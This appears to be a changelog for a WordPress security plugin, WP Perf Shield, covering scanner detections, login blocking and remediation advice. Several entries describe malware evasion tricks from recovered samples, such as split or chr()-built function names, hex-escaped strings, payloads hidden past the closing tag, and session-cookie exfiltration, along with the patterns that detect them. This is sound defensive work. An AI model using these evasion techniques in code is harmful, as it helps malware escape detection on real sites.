**You do not need to do anything.** If either variant is already on the site, it was being detected before this release and still is. If you have a pending finding for one, remediate it as usual.

**One thing you may notice.** These folders previously showed as a *high* finding from the fake-plugin shape heuristic. They now show as *critical* from exact identification instead. Nothing got worse; WP Perf Shield simply knows them by name now rather than inferring them from shape, and says so with more confidence. Auto-removal behaves as it did.

**What was deliberately left out.** No file hash was added for `auto-asset-helper`, because that sample was not available to hash and a hash copied from notes is one that matches nothing while looking like protection. Its slug and folder patterns are in, which is what does the blocking. The two shell-company author names behind these variants were also kept out of the upload blocklist, which blocks on a single match: one of them is a plausible name for a genuine vendor, and blocking every upload mentioning it would eventually stop something legitimate.

## 1.4.48

**What this is about.** A doorway kit — the sort that quietly turns your site into a redirector for someone else's traffic — was detected correctly in testing, then renamed and tested again. Renaming the folder, the payload files, and one key inside its configuration was enough to silence two of the three detections. The kit kept working throughout.

Nothing was lost that finds web shells; those were still caught. What was lost is the finding that groups them: *these files are one kit, and this is the directory to delete*. Without it you get a list of separate criticals and no instruction.

**What you will see now.** A kit is identified by the configuration it carries and the code that reads it, rather than by any name. In practice that means one critical finding naming the kit's root directory, with the cloaking configuration reported separately so you can see the size of the blocklists it holds. In the sample behind this release those were 111,088 addresses, 87 organisations and 569 user agents — the working capital of the operation, and the thing it cannot casually regenerate.

**One finding, not several.** Previously a kit's own sub-directories could each score and each report the directory above them, so one intrusion arrived as three nested criticals. You now get the outermost directory only. Deleting it takes the rest with it.

**If you have been ignoring a "doorway kit" finding on a legitimate folder,** check it again after upgrading. Two false positives were caught and fixed before this release shipped: an earlier draft named the site's own web root as a kit, and reported nested duplicates. Neither ever reached a release, but the same shapes are now asserted against in the test suite, which is what should have been true the first time.

**Scan time.** The new checks cost about fifty milliseconds across seven hundred directories, measured rather than estimated. If you upgraded for 1.4.46 or 1.4.47 because scans were timing out, this does not undo that work.

**Nothing to configure, and no change to what gets deleted automatically.** Kit findings behave as before: removable when the directory is safely outside WordPress's own paths, reported for manual removal when it is not.

## 1.4.47

Upload and activate as usual. If safe mode is still showing, clear it from the admin notice.

**What this fixes.** 1.4.46 stopped scans from ending the request, but they could still run out of time and report partial results - which is not much use when something is actively attacking the site.

Six of the detections were each processing every file independently, doing identical work six times over. Files are now processed once per scan and the result shared. A full pass over a large plugin file drops from about a quarter of a second to a twentieth, which on a site of any size is the difference between a scan that finishes and one that does not.

**Nothing about what is detected has changed**, and that is verified rather than assumed - the shared result is checked to be byte-identical to computing it fresh.

**If scans still do not complete**, your execution limit is likely very low. Raise `max_execution_time` if you can, or run scans from the Overview tab when the site is quiet.

## 1.4.46

Upload and activate as usual. **If WP Perf Shield has been showing the safe mode notice, this is the release that fixes it.**

**What went wrong.** WP Perf Shield limited its own scans to 45 seconds. Many hosts allow PHP only 30. A limit set above the one your host enforces cannot work - the scan intended to stop fifteen seconds after PHP had already killed it, so every scan ended in a fatal error and the fail-safe switched scanning off to keep the site running.

**What changed.** The budget is now worked out from your host's own `max_execution_time`, leaving eight seconds spare so the page still renders after the scan stops. On a 30-second host that is 22 seconds. The time is also checked inside the long file checks rather than only between them, so a single slow check can no longer run past the whole budget.

**What you will see now.** On a large site the scan may report that it stopped early and skipped some checks. That is the intended behaviour and the findings it did produce are real - run a manual scan from the Overview tab when the site is quieter and the skipped checks will run.

Safe mode clears from the admin notice once you have updated.

## 1.4.45

Documentation only. No code changed.

The detection reference is now readable at a glance: four tables covering what WP Perf Shield looks for, what clears a file where that matters, and the sign-in thresholds in one place.

Two things are deliberately set apart from the prose around them. The salt-rotation warning is a callout carrying the URL for fresh values and the reason the order matters, because it is the one instruction here that fails silently if missed. The `WPS_DISABLE_LOGIN_GUARD` escape hatch is a code block, because whoever needs it is locked out and should be able to copy it without reading a sentence.

## 1.4.44

Documentation only. No code changed, so there is nothing to test after upgrading.

The reference document now describes what the scanner actually detects. Nine detections were added over the previous eleven releases and none of them had reached it, so the documentation described a plugin noticeably less capable than the one you were running.

It also corrects something that had been wrong since 1.4.15. The readme claimed the plugin protects itself with a must-use guard that restores it if something disables it. That was withdrawn twenty-eight releases ago after it took a site down twice, and the claim should have gone with it. If you had read that and assumed this plugin could not be quietly deactivated by malware, that assumption was wrong and is worth revisiting.

The Docs tab inside the plugin renders these same files, so it is updated too.

## 1.4.43

Upload and activate as usual. The blocking is on by default.

**Blocking.** If something on your site tries to send WordPress login sessions to an external address, the request is now refused before it leaves, and you get a critical event naming the destination.

Nothing legitimate is affected. Requests to your own site pass, WordPress.org and Akismet pass, and any request that does not carry session cookies passes - which is almost all of them. If you ever need it off, there is a setting.

**What it cannot catch.** This works through WordPress's own HTTP functions. Malware using raw cURL or a socket connection goes around it. That is worth knowing rather than assuming you are covered: it closes the common case because implants inside plugins tend to use the WordPress functions, but it is not a guarantee.

**Removal.** Files caught stealing sessions are now moved to quarantine automatically, where they remain recoverable for thirty days rather than being destroyed. Protected theme and core files are never touched, and removal is deliberately not attempted when the destination is a host WordPress itself uses - those findings are flagged for you to judge instead.

**Neither of these undoes the theft.** Any session already sent stays valid until you change the authentication salts in wp-config.php. Get fresh values from api.wordpress.org/secret-key/1.1/salt/, and do it after the file is gone rather than before, or the new session is captured as well. The plugin tells you this at the moment it blocks something, which is when it matters most.

## 1.4.42

Upload and activate as usual. No settings to change, and nothing about what the scanner detects has altered.

**What changed.** When the same file is found in several places, you now get one finding listing every location instead of one finding per copy.

This matters for attack kits, which plant a payload in a dozen directories under randomly generated names precisely so that finding one and removing it accomplishes nothing. A dozen identical criticals pushed everything else off the screen and never made the point that they were a single intrusion.

**Copies are matched by content, not by name**, since the names are the part that gets regenerated. Files with identical bytes group together however they are named; files with the same name but different contents stay separate.

**Nothing is hidden by this.** A file caught by two different checks still produces two findings, because they tell you different things. Every path is retained on the grouped finding, and removal still acts on all of them.

## 1.4.41

Upload and activate as usual, then run a scan.

**What this finds.** Files that send session cookies, submitted passwords, stored password hashes or your site's authentication keys to an external address.

The sample this was built from waits until an administrator loads any page, collects their WordPress session cookies, and posts them to a hardcoded host once every twelve hours. Whoever receives them can replay them and be signed in as that administrator without ever knowing the password - which is why nothing appears in any login log, and why a login guard cannot help.

**If this fires, the order of the fix matters.** Remove the file first, then change the authentication salts in wp-config.php - fresh values from api.wordpress.org/secret-key/1.1/salt/. Rotating the salts is what invalidates the sessions already taken. Deleting the file stops further theft but leaves whoever has your current session signed in indefinitely.

Doing it the other way round is worse than useless: rotate first and the still-present file simply captures your new session.

**Ordinary plugins are not affected.** Calling a hardcoded API is normal and does not fire on its own. Reading cookies without sending them does not fire either. Only the combination does, and only when what is sent is a credential rather than a version string or a site URL.

## 1.4.40

Upload and activate as usual, then run a scan.

**Executable PHP is now reported by where it is.** A .php file in wp-content/uploads, wp-content/fonts or wp-content/upgrade is reported regardless of what it contains, because nothing legitimate puts code in those directories. This matters for back doors that stay completely silent unless a request carries a secret value - there is nothing in their behaviour to detect, but their location gives them away.

In caches, logs and backup directories the rule is deliberately weaker, because plugins genuinely do write .php files there. A finding in one of those means something about the file was wrong as well as its location.

**Security plugins are not reported.** Wordfence and others store logs as .php files that begin by exiting immediately, so the extension prevents anyone reading them while nothing executes. Files in that shape are excluded. An early version of this check flagged four of them, which would have been a worse outcome than missing something.

**Function names built with chr() are now detected**, alongside the character-by-character spelling added in the previous release. A must-use plugin recovered from a live site built its control token from 295 chr() calls and scored zero on the earlier measure.

**A note on must-use plugins.** If a finding points at wp-content/mu-plugins, treat it seriously. WordPress loads those automatically and they cannot be switched off from the Plugins screen - the same property that caused this plugin to withdraw its own must-use component in 1.4.15.

## 1.4.39

Upload and activate as usual, then run a scan.

**What this finds.** Files that build function names by pulling single characters out of another string by position. A recovered sample kept the sentence "I could not have a more welcome visitor 64 group of zain bani" in a variable and spelled `base64_decode` out of it a character at a time, then executed the result. The name never exists in the file, so no search for it can succeed.

**Why it needed a new check.** Every earlier detection here was blind to it, and for five different reasons - nothing was split, no decoder name was present, the obfuscation density was below the threshold, and the payload was not in a string. Each check was working correctly and none of them could see it.

**What gives it away.** Spelling a name costs one indexing expression per letter, and they have to be joined in order. The sample did that twenty-eight times. Across a production theme, a legitimate GPL theme and this plugin itself, the highest count in any file is three, in ordinary string handling.

**If this fires, do not read the file for reassurance.** The visible parts are chosen to look harmless - that is what the innocuous sentence is for. Judge it on the construction.

## 1.4.38

Upload and activate as usual, then run a scan.

**What changed.** Two narrow gaps in the check that finds unauthenticated file access.

Data arriving in the raw request body now counts as request input. Previously only query strings, form fields and cookies did, so a script reading `php://input` looked as though it took no input at all.

And a single filesystem write is now enough. It used to take two. The reasoning for two was to keep false positives down, but a file that writes attacker-supplied bytes to your server with nothing checking who asked is dangerous on its own, and measurement showed the second primitive was buying nothing: across seventy-nine files of genuine theme and plugin code, relaxing it adds no findings.

**You will not see more noise.** Files are still cleared by any one of three things - loading WordPress, checking authorisation, or taking no request input - and ordinary code does at least one. What changes is the number of genuine components found inside an intrusion: on the toolkit this was measured against, three became six.

**Severity still distinguishes.** A file manager with six capabilities is critical. A single write endpoint is high. Read the rating before acting.

## 1.4.37

Upload and activate as usual, then run a scan.

**What this finds.** A PHP file that reads its own contents, splits itself at its closing tag, and runs whatever comes after. It is an efficient way to carry a payload, because the hidden part is not in a string or a variable - it is raw data sitting past the end of the code, where nothing looking for encoded text will find it.

**A general repair rides along.** PHP allows a comment between a function name and its bracket, so `eval` written with comments either side still calls eval while defeating any pattern expecting a space there. Every check here that looks for a function call was evadable that way. Comments are now removed before matching, and URLs inside strings are left alone.

**Read this before deleting anything it finds.** Commercial security and licensing products protect their own code with exactly this technique, for the same reason malware does - so that it cannot be read. The sample this was built from carried a Monarx copyright notice, and Monarx is genuine software that hosting companies install.

The check cannot tell the two apart, so it is rated high rather than critical, it names any vendor it recognises, and it asks you to confirm with your host before acting. If nobody claims the file, then treat it as a backdoor. If your host says it is theirs, leave it alone - removing your host's security agent because a scanner was confident would be a worse outcome than the thing it was looking for.

## 1.4.36

Upload and activate as usual, then run a scan.

**What this finds.** Obfuscated JavaScript carried inside a PHP file and printed into your pages. The sample this was built from called itself a "simple js plugin", had a correct header and security guard, and contained perfectly readable PHP - with a hundred and eleven thousand bytes of scrambled script sitting in the middle of it.

The PHP was not the problem. It was the wrapper. Every other check here examines PHP, so a file with honest PHP and a malicious script passes all of them.

**Minified files are not affected.** This is worth stating because it was the hard part. Minified JavaScript is also one enormous line, and flagging on length would have marked every optimised asset on every site. Minifiers shorten names; obfuscators rename everything to hexadecimal tokens like `_0x4f78`. The theme used for testing ships a legitimate eighty-kilobyte single-line bundle and scores zero.

**Reading a finding.** Inside a PHP file this is rated critical - there is no legitimate reason for one to carry obfuscated script. In a standalone .js file the threshold is much higher and the rating lower, because a vendor script protected against copying is unusual rather than malicious. In that case compare it against a fresh copy from the vendor before acting.

## 1.4.35

Upload and activate as usual, then run a scan.

**What this finds.** Files that write their own function names in pieces - `'HTTP'.'_USER_A'.'GENT'` instead of `HTTP_USER_AGENT` - so that searching the file for those names finds nothing. There is no legitimate reason to do it. The only purpose is to defeat the search.

**Why it was needed.** A sample styled as an image optimisation plugin defeated every other check here. It had a correct plugin header, a proper security guard, an uninstall routine and a translation file. It contained no eval, no obfuscated control flow, and no encoded blob in any PHP file, because its payload was in a separate binary file that a PHP scanner never reads.

It was also careful about who saw it: it does nothing for administrators, editors and authors, nothing on admin screens, and nothing for anything identifying itself as a crawler. Then it disables caching so the result is never stored. In practice only a logged-out visitor ever receives the injected script, which is precisely the audience least able to report it.

**Reading a finding.** The names a file hides tell you what it is for. Concealing crawler names alongside `is_user_logged_in` and `administrator` means the file is choosing who sees its behaviour, and choosing to hide from you.

If this fires, do not judge the file by how ordinary the rest of it looks - in this sample the rest of it looked entirely ordinary, and the part that mattered was not in the file at all.

## 1.4.34

Upload and activate as usual, then run a scan. This is the largest detection improvement in the 1.4 series.

**What prompted it.** A complete attacker toolkit was recovered and run against the scanner: twelve directories, three hundred and nine files. Four were detected. That is now eleven of the eleven containing malware, with the twelfth - a real plugin planted as a decoy - correctly ignored.

**What the kit looks like, because yours may too.** Each directory is a genuine plugin copied under a random seven-letter name, with the payload dropped in as `index.php` - the one filename nobody looks at twice in a plugin folder, since WordPress puts a harmless one-line file there by convention. Finding and deleting one achieves nothing while the others remain, which is the entire design.

**Three new things are found.** Payloads hidden behind chains of decoders, where the function names are split across string joins so that searching for them fails. Minimal upload droppers small enough to have slipped under the previous threshold. And `php.ini` files dropped inside your site that re-enable shell execution and remove the directory restriction your host applies - a third of this kit by file count, and invisible to any scanner that reads only PHP, including this one until now.

**If the php.ini check fires**, that file is not itself doing anything: it is removing the limits that would contain whatever else is there. WordPress never needs such a file inside wp-content. Delete it, and treat its presence as evidence that something else is present too.

## 1.4.33

Upload and activate as usual, then run a scan. This release closes a real blind spot.

**What it now finds.** A PHP file that does not load WordPress, checks no password, capability or session, and can still upload, overwrite, rename or delete files based on what a visitor sends it. That is a web shell, and it is how an intruder keeps access after the way in has been closed.

**Why this needed its own check.** Everything the scanner looked for before was a form of hiding - encoded strings, hex escapes, deliberately unreadable control flow. The sample this was built from used none of it. It was clean, readable PHP that anyone could understand at a glance, and it was completely invisible to every check here, because it never tried to hide. It did not have to.

**If it fires on your site**, look at the file before deleting it. If you did not put it there and no plugin you recognise did, treat the site as compromised and find out how it arrived - removing a shell without closing the way in only buys a few days. If it turns out to belong to a plugin or your host, it is still reachable by anyone on the internet and should be removed or put behind a login.

**False positives should be rare.** Any one of three things clears a file: it loads WordPress, it checks authorisation, or it takes no request input. Ordinary plugin and theme code does at least one of those. A finding rated high rather than critical means fewer signals were present and is worth reading before acting.

## 1.4.32

Upload and activate as usual. Reporting only; nothing about protection changed.

**The Security posture panel now shows what it was already counting.** Permanently blocked addresses, and how many addresses have been reported to Akismet as spam. Both were being recorded already - since 1.4.26 and 1.4.31 - and simply never displayed.

Two figures will look low at first, and that is correct rather than broken: most counters were previously discarded at midnight instead of being kept for the seven-day view, so their history starts from this upgrade.

**A new row appears once your site has seen it:** a breakdown of which rule decided recent blocks - a sign-in attempt on an account that does not exist, too many different usernames from one address, or rotation across an address range. It stays hidden until one of those has fired, so a quiet site is not given a row of zeroes to puzzle over.

**One row is gone.** "Tamper protection (must-use guard) - withdrawn in 1.4.15" appeared on every install, permanently, describing a feature removed seventeen releases ago. It told you nothing you could act on. If a leftover must-use file is genuinely still on disk you will now see a row naming the file to delete, and otherwise nothing at all.

## 1.4.31

Upload and activate as usual. Nothing to configure.

**What changed.** When an address tries to sign in as an account that does not exist on your site - `admin`, `root`, `administrator` and the rest of that list - it is now blocked permanently on the first attempt rather than for fifteen minutes. It is also reported to Akismet, which it already was.

**What a permanent block does and does not do.** It stops that address signing in. It does not stop it reading your site, because the block sits on the authentication step and nowhere else. So a permanent block cannot take your site away from a real visitor who happens to be behind that address later; at worst it prevents them logging in, and if they have no account that is no loss at all.

**It cannot catch you.** The rule only fires for a username that does not exist on the site. Your own username exists, so no attempt using it can ever put your address on this list, however many times you mistype the password. Addresses on your allowlist, and addresses you have signed in from as an administrator, are refused outright.

**You can undo it.** Diagnostics has a new list, "Permanently blocked from signing in", showing each address, the username it tried, and when. Every row has a Remove button. Addresses do get reassigned, so if one of these ever turns out to belong to somebody real, take it off the list and they can sign in again immediately.

The list holds a thousand entries and drops the oldest first, so it cannot grow without limit.

## 1.4.30

Appearance only. No PHP changed in this release at all, so there is nothing to reconfigure and no behaviour to re-check.

The Settings screen work in 1.4.28 was incomplete. Field labels were still being styled as though they were data-table column headings - small capitals with letter spacing and a fixed grey that ignored your colour scheme entirely - because an older rule in the stylesheet reached every heading in the plugin, not just the ones in tables. Labels now read as labels, and follow the light or dark scheme like everything else.

Two smaller corrections you may have noticed: the `define( 'WPS_DISABLE_LOGIN_GUARD', true );` line in the login protection notes was breaking across two lines in a way that made it awkward to copy, and the Akismet test button was larger than the status text beside it.

Data tables are unaffected. The rule they rely on was left exactly as it was, and the fix is scoped to the settings form.

## 1.4.29

Upload and activate as usual. No settings to change and no detection changes.

**What this fixes.** When the scanner finds a group of files sharing one modification timestamp, it suppresses them as a batch - a plugin or theme update looks like that, a backdoor does not - and writes a short note saying so. That note was written every time the scanner ran, and because file timestamps do not change, the same few notes were recorded over and over.

Those notes go into the same capped, tamper-evident log as real findings. If you scan frequently, they were pushing genuine security events out of retention. On one log reviewed for this release, five scans in twenty-five minutes produced thirty-five duplicate entries in a two-hundred-entry log.

Each batch is now noted once, and noted again only if it grows - more files landing on the same timestamp is a new fact worth recording.

**Nothing about detection changed.** The same files are suppressed for the same reason; only the repetition of the explanation is gone. If your log is currently full of "mtime check: suppressed N files" lines, they will stop accumulating after this upgrade, though the existing ones remain until they age out.

## 1.4.28

Presentation, plus one correction worth knowing about.

The Settings screen is rebuilt. It was the only screen in the plugin still using WordPress's default form styling instead of the plugin's own, which is why it looked out of place - and in dark mode the descriptions and text boxes kept the light admin's colours entirely. The label column now lines up across all four sections, every checkbox row uses the same layout, and form controls follow the colour scheme.

**One correction.** In 1.4.27 the "Report attackers to Akismet" checkbox displayed as off while the feature was actually on by default. Two consequences: the screen was telling you the wrong thing, and because an unticked box submits nothing, opening Settings and saving any other change would have written the off value and silently stopped the reporting.

If you saved settings at any point while on 1.4.27, check that box now - it may have been switched off without your knowing. From this release the displayed state always matches the code, and a test asserts it for every checkbox on the screen so the two cannot drift apart again.

Nothing else about how the plugin behaves has changed.

## 1.4.27

Upload and activate as usual. One default has changed and one control is new.

**Automatic reporting to Akismet is now on by default.** When an address is blocked on conclusive evidence - many usernames, a repeat offence, or a bot-only username - it is reported to Akismet's shared spam database. If you would rather it stay local, turn it off in Settings; the toggle is still there.

**A guard protects sites behind a CDN.** If your site sits behind Cloudflare or a similar proxy and the real visitor IP is not being restored, the address this plugin sees is the CDN's, not the attacker's. Automatic reporting therefore stands down whenever the blocked address falls in a known Cloudflare range, or a private or loopback range, and notes the skip in your log. This keeps the plugin from ever reporting a CDN's own addresses to Akismet on your behalf.

**You can report an address by hand.** The blocked-addresses list in Diagnostics now has a "Report spam" button on each row. Because you are looking at the row and choosing, that button is not subject to the proxy guard - if you know a proxy-range address is a genuine attacker, you can still report it. It reports the one address, once.

If you are on a plain host with no proxy, none of the guard applies to you and reporting simply works.

## 1.4.26

Upload and activate as usual. The login protection is now firmer, and firmer in proportion to evidence rather than across the board.

**What is stronger.** The duration of a block is now decided by what your site has actually seen. An address that tries many different usernames, or that comes back after a previous block expired, is held for longer - up to a week for a persistent returning attacker. An address trying five or more usernames is held for a full day at once.

**What is unchanged, deliberately.** A first mistyped password against your own username, from an ordinary address, still gets only a fifteen-minute cool-off. The escalation applies to addresses that behave like attackers, not to people who fumble a login. Your own address still cannot be blocked, and the wp-config.php escape hatch is unchanged.

**The Akismet fix.** Previously a "clean" verdict from Akismet could impose the short cool-off even on an obvious attacker, because Akismet had not yet catalogued that address. That is corrected: your site's own evidence now leads, and Akismet can only lengthen a block, never shorten one below what your evidence warrants.

**Reporting attackers to Akismet (new, optional, off).** You can now turn on reporting of confirmed attackers back to Akismet in Settings. When on, an address blocked on conclusive evidence is submitted to Akismet's shared database, which helps every site that uses it. It is off by default because that database is shared: an address you report is flagged for everyone. For that reason the plugin only ever reports addresses your own site has already proven to be attacking - never one blocked on a single mistyped password - and reports each one only once, after the block, never while someone is signing in. It needs an active Akismet key; without one it simply does nothing.

## 1.4.25

Upload and activate as usual, then run a scan. This release closes a real evasion and adds two detections, both built from a live infection.

**What it now finds.** Search-engine cloaking: a file that checks whether the visitor is a search crawler, or arrived from a search engine, and serves different content if so. This is how spam gets into your search results without ever appearing on your site - you see the normal pages, Google sees something else. If you have ever been told your site is showing pharmacy or product spam in search results while looking perfectly normal to you, this is the shape of it.

It also finds control-flow-flattened PHP, identified by counting `goto` statements. Real code does not use them; obfuscated code uses hundreds.

**The evasion that was closed.** String matching now resolves hex and octal escapes first. A file writing `\x48\x54\x54\x50_USER_AGENT` instead of `HTTP_USER_AGENT` reads identically to PHP and differently to a scanner, and the sample this was built from used exactly that trick. Every existing content check benefits, not just the new ones.

**If the cloaking check fires on your site**, do not simply delete the file - a legitimate index.php lives at your site root. Compare it against a clean copy of WordPress of the same version first. Then check Google Search Console for indexed pages you did not create, because those outlive the file and need removing separately.

You can test for cloaking yourself without any plugin:

```
curl -A "Googlebot" -H "Referer: https://www.google.co.jp/" https://yoursite.com/
```

If that returns different content from a plain request, you have it.

## 1.4.24

Presentation, plus one useful warning. No settings to change and no detection changes.

The server log inspection screen is easier to read: the log path leads with its type as a quiet qualifier rather than a column repeating the same few words, row actions are links instead of buttons competing with the page's main controls, and sizes are aligned so a large file is obvious at a glance.

**Log files over fifty megabytes are now marked "slow to scan".** That is worth heeding. A full indicator scan reads the whole file, and on a log of a hundred megabytes or more that can exceed your host's PHP execution limit and simply stop partway. If you need to search a log that size, your hosting panel's own log viewer or a shell will do it faster and more reliably.

The note about hosts owning the raw access log now sits under the table rather than above the buttons, since it only matters if the log you wanted was not listed.

## 1.4.23

Upload and activate as usual. On by default.

**What it fixes.** The protection added in 1.4.17 counted failed sign-ins per address. Automated attacks answer that by spreading attempts across many addresses in the same range, so no single one reaches the limit - which is exactly what was seen on a live site: five attempts against one username from four addresses in the same /24, none of them reaching five.

Failures are now counted against the range as well. Twelve failures from at least three different addresses in one range within fifteen minutes blocks sign-ins from that range for thirty minutes.

**One noisy address is still treated as one address.** Twelve failures from a single host blocks that host and leaves the rest of its range alone. Rotation requires at least three distinct addresses before a range is considered at all.

**Your own range is safe.** Any range containing an address you have signed in from as an administrator, or an address on your allowlist, is never blocked - and that covers every address remembered over the last thirty days, not just the one you are on now.

**When to turn this off.** Range blocking is the one part of this feature that can affect people who are not the attacker. A /24 can be a mobile carrier's egress with thousands of ordinary users behind it. If your visitors are likely to share a network - a mobile carrier, a university, a large employer - switch it off in Settings and keep the per-address protection, which cannot affect anyone but the address it blocks.

Range blocks apply to sign-in only. They do not lock a range out of the rest of your site.

## 1.4.22

Cosmetic only. If you are on 1.4.21 and the heading did not bother you, there is nothing here you need.

WordPress lets you set a timezone as either a city or a plain offset such as UTC+8. Where you have chosen an offset, the column heading now says UTC+8 exactly as the Settings screen does, instead of GMT+8. The times themselves were already correct and are unchanged.

## 1.4.21

Upload and activate as usual. No settings to change.

Timestamps now display in whatever timezone your site is set to, and the column heading names it, so a Malaysian site shows Time (MYT) with the hours already adjusted. Nothing needs configuring beyond the timezone you have already set in WordPress under Settings, General.

**Stored times are still UTC and will stay that way.** That is not an oversight. A log written in local time is ambiguous twice a year when the clocks change, and it cannot be compared against your server's access log or anything your host gives you. The stored value is the reliable one; the display is the convenience. If you export events, expect UTC.

The events and incidents tables are also easier to read: detail text is no longer forced into a monospaced font that wrapped every row to three lines, and an incident containing many repeats of the same step now shows a count instead of the same words over and over.

## 1.4.20

Upload and activate as usual. Nothing about login protection or detection has changed.

Diagnostics and Settings now show how many Akismet API calls your key has used this month, your plan limit, the percentage, and a warning if Akismet reports your key as throttled for consistently exceeding its plan.

**Read the number with one thing in mind.** Most of it is Akismet checking comments, which it would be doing whether or not this plugin existed. Login protection adds roughly one call per blocked address, so on a typical site it is a rounding error against the total. The panel says as much on screen, so the figure is not mistaken for the cost of this feature.

The figure is cached for an hour, because a status panel that consumed the allowance it reports on would be self-defeating. Pressing "Test Akismet connection now" refreshes it immediately along with the key check.

If your key is unlimited, the limit reads "unlimited" rather than a number. If Akismet cannot be reached the panel says so and retries in five minutes rather than an hour.

## 1.4.19

Documentation only. No code changed and no behaviour changed. If you are on 1.4.18 there is nothing here you need.

The Akismet notes for 1.4.17 hedged in two places where Akismet's published specification is explicit: a custom `comment_type` is documented usage, and `comment-check` requires only the key, the blog URL and the address, so a check carrying no content is a supported call. The integration always worked this way; only the description of it was overcautious.

## 1.4.18

Upload and activate as usual. Nothing about how the login protection behaves has changed - this release is about being able to see it.

**To check it is working right now**, go to Settings and press "Test Akismet connection now". It reports one of four things: the key is valid and verdicts will be used, the key is not valid, Akismet could not be reached, or Akismet is not active. Any answer other than the first means blocks still happen, just always at the default sixty minutes.

**Diagnostics** now shows whether login protection is active, the Akismet state, failed sign-ins seen today and over seven days, and addresses blocked over the same periods. If you have just installed it and everything reads zero, that is the correct answer on a site nothing has attacked yet - the counters move on the first failed sign-in, well before anything is blocked.

**Block records now say why they last as long as they do.** The reason reads in plain words rather than leaving you to infer it: address known for spam, address not known for spam with a shorter cool-off, or no usable answer and the default duration.

Worth restating, since it is the thing that makes the guard look quiet: Akismet is consulted only when an address is actually blocked, never on the path of a sign-in attempt. On a site with no attacks there will be no Akismet activity at all, and that is the design working rather than failing.

## 1.4.17

Upload and activate as usual. Login protection is on by default.

**What it does.** Five failed sign-ins from one address within fifteen minutes blocks that address for an hour. Usernames automated tooling tries first - admin, administrator, root, test and similar - are blocked on the first attempt, but only when no such account exists on your site; if you really do have a user called admin, attempts against it are counted normally.

**You cannot be locked out by it.** Your address is never blocked while you are signed in as an administrator, and any address you have signed in from as an administrator in the last thirty days stays protected even when you are signed out. There is an allowlist in Settings for office or VPN addresses several people share. Every block expires on its own.

If you are ever locked out anyway, add this to wp-config.php over FTP - no database access needed:

```
define( 'WPS_DISABLE_LOGIN_GUARD', true );
```

**Akismet.** If the Akismet plugin is active and has a key, it is detected automatically. There is nothing to enter and no second copy of the key. It changes only how long a block lasts: twenty-four hours for an address it knows to be bad, fifteen minutes for one that looks clean, sixty minutes when there is no usable answer. It never decides whether to block, and it is never called while someone is waiting to sign in. Deactivating Akismet loses the duration logic and nothing else.

**XML-RPC sign-in is a separate switch, off by default.** XML-RPC lets a single request carry hundreds of credential guesses through `system.multicall`, so disabling authentication there removes a large share of automated traffic. It is off because Jetpack and the WordPress mobile apps sign in this way - if you use either, leave it alone.

**What this does not do.** WordPress still starts up for every attempt, so this reduces damage and noise rather than server load; if the volume is heavy, a firewall rule at your host or CDN will do more, because it rejects before PHP runs. And it stops guessing, not someone signing in with a password they have already stolen - that needs two-factor authentication.

## 1.4.16

Presentation only; no data migration, no settings changes, no detection changes.

The events tables look different. Severity now drives the display: a coloured rail down the left of each row and a dot beside the event name, so a critical finding is visible without reading the row. Colour is not the only channel - the dot and the ordering carry it too - and the band is announced to screen readers.

Event names that previously appeared as raw identifiers, such as `admin_screen_visited`, now read as English. Where a curated label already existed it is unchanged.

If you have written custom CSS against these tables, the markup changed: the overview and events tables now use `.wps-events` with a `data-wps-sev` attribute on each row, and column widths moved out of inline styles into classes.

One functional fix rides along. The severity classifier is shared by every screen that shows events, replacing two hand-written lists the Events tab kept privately. Those lists had drifted, and one consequence was that `wp_config_modified` - a critical finding - was not in either of them.

## 1.4.15

Upload and activate as usual. **The must-use tamper guard is withdrawn**, and upgrading removes it.

That removal is active, not passive. It is not enough to stop installing the guard, because a must-use plugin already on disk keeps loading on every request whether or not this plugin puts it there. So the upgrade deletes `0-wps-guard.php`, `.wps-guard-key.php` and `.wps-guard-events.php` from `wp-content/mu-plugins`, and clears the options that went with them. Only those three exact filenames are touched; nothing else in that directory is read, walked or modified.

If the file cannot be deleted - a read-only `mu-plugins` directory, most commonly - it is overwritten with an inert stub instead, so the withdrawn code stops running even where removal fails. Diagnostics will then show "withdrawn (leftover file)" with the path, and you can delete it by hand when convenient.

What you lose: the plugin no longer notices or reverses being removed from the active plugin list. Malware that deactivates it will now succeed silently. That is a real reduction in capability, and the reasoning behind accepting it is at the top of this document under "Parked: must-use tamper protection".

What you gain: nothing this plugin installs can now load before WordPress does, and every part of it can be switched off from the Plugins screen.

If your site is in safe mode from 1.4.12, clear it from the admin notice after upgrading.

## 1.4.14

Upload and activate as usual. The must-use guard is regenerated automatically.

This completes the fix started in 1.4.13. That release throttled the one recording path behind the reported outage and left three others writing on every request, and its size cap read a cached file size that could never trigger in a long-lived process. A worst-case measurement - the guard in its failure state across 200,000 requests - showed the spool still reaching 52 MB.

The throttle now sits inside the recording function itself, so every event type is bounded to one record per fifteen minutes whether or not a future caller remembers to ask for it, and the stat cache is cleared before the size is checked. Under the same measurement the spool now stops at the 256 KB ceiling.

Nothing is required of you. If your site is currently in safe mode from 1.4.12, clear it from the admin notice after upgrading.

## 1.4.13

Upload and activate as usual. The must-use guard in mu-plugins is regenerated automatically, and any oversized event spool left by the fault is discarded on the first run rather than imported.

This release fixes a fault in this plugin that could take a site down. If the guard's signing key file went missing - which is what a backup, migration or sync tool that skips dot-files will do - the guard recorded an unverifiable-state event on every single request, and the plugin later tried to import all of them in one go. On a site with enough traffic that exhausted memory and produced a blank page.

Three things changed: the record is throttled to once every fifteen minutes, the spool is capped at 256 KB at both the writing and reading ends, and a missing or malformed key is now regenerated and the expected state re-signed, which ends the condition rather than recording it indefinitely.

If you deleted `0-wps-guard.php` or `.wps-guard-key.php` by hand while recovering, you do not need to restore them; upgrading writes both again. If your site is currently in safe mode from 1.4.12, clear it from the admin notice after upgrading.

## 1.4.12

No data migration; upload and activate as usual. Upgrading also clears any recorded crash from an earlier version.

If this plugin ever fatals from now on, the site stays up. The crash is recorded, the next request loads a passive core only - no scanning, no admin screens, no remediation - and an admin notice tells you the file, line, message, time, and whether it happened on the front end or in wp-admin, with a button to clear it and try again.

While that notice is showing, the plugin is not scanning anything. That is deliberate and it is stated on screen, because a security plugin that appears to be working while doing nothing is worse than one that is honestly switched off.

If you are recovering from a white screen right now: rename `wp-content/plugins/wp-perf-shield` to something else over FTP or SSH. Do not deactivate it by editing the active_plugins option in the database - the tamper guard would restore it and the white screen would return. Renaming is safe, because the guard reports a missing plugin directory rather than re-adding it.

## 1.4.11

No data migration; upload and activate as usual.

